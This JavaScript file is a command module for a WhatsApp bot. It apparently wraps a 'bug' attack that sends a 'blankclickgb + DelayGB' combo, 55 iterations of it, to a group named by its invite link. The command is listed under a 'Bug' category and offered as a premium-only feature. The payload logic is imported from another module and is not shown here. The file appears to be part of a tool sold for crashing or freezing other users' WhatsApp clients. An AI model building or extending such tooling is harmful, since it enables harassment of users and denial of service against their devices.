import {
  sendGroupCombo,
  parseGroupInviteCode,
  replyProcessing,
  replyDone,
  replyFailed,
} from "@/src/services/system/bug/index.js";

export default {
  name: "groupcombo",
  aliases: [],
  description: "Kirim kombo blankclickgb + DelayGB ke grup via link (55 iterasi)",
  usage: "https://chat.whatsapp.com/xxxx",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, logger }) => {
    const q = args.join(" ").trim();
    if (!q) return reply(`*Syntax Error*\nExample: ${prefix + commandName} https://chat.whatsapp.com/xxxx`);

    const codeGroup = parseGroupInviteCode(q);
    if (!codeGroup) return reply("*Link group tidak valid*");

    await replyProcessing(reply, q, commandName);

    (async () => {
      const log = logger || console;
      try {
        const { target, success, failed, ms } = await sendGroupCombo(sock, q, { logger: log });
        log?.info?.(`[groupcombo] selesai! sukses: ${success} | gagal: ${failed} | target: ${target}`);
        await replyDone(reply, target, commandName, { success, failed, ms }).catch(() => {});
      } catch (e) {
        log?.error?.(`[background Error - groupcombo]: ${e?.message || e}`);
        await replyFailed(reply, q, commandName, e).catch(() => {});
      }
    })();
  },
};
